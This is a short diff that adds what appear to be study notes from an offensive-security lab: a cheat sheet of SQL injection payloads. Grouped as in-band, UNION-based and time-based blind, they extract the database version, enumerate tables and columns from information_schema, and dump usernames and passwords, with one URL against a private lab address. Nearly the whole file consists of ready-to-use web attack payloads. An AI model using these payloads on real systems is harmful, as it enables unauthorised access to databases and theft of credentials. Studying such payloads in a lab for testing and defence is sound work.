@@ -1,0 +1,15 @@
+IN-BAND
+' OR 1=1 -- //
+' OR 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+UNION Based
+
+' ORDER BY 1-- //  #test number until you a message that column is unknown
+' UNION SELECT null, null, database(), user(), @@version  -- //   #use null as payload 
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+BLIND - Timebased
+
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //  # if offsec user is present, application will freeze for 3 second
